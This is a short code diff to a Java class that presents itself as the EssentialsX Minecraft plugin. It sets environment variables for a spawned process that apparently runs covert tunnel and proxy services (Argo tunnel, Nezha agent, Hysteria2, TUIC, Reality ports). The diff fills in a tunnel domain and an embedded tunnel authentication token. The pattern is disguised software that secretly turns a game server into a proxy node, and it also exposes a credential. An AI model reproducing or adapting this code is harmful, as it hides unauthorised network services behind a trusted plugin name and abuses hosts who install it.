@@ -73,17 +73,17 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
+        env.put("UUID", "181f6543-6d87-4f19-b75b-8169439635db");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
-        env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
+        env.put("ARGO_PORT", "8090");
+        env.put("ARGO_DOMAIN", "freemcserver.lovewhore.dpdns.org");
+        env.put("ARGO_AUTH", "eyJhIjoiYzJjNmUzZTEyOTRjZmU3NWEyMDk4NzIxYzVkY2I2YjQiLCJ0IjoiMjdiNDUxMDktN2M1MS00MDAyLTlmOTYtZWQzOTAwMTUxZjQwIiwicyI6IllXWmlaV013WW1NdE9XRXdNUzAwTmpnNUxUaGxaV1l0TkRaaFpqazNNalk0TW1OaSJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "46476");
-        env.put("TUIC_PORT", "50801");
+        env.put("HY2_PORT", "41795");
+        env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
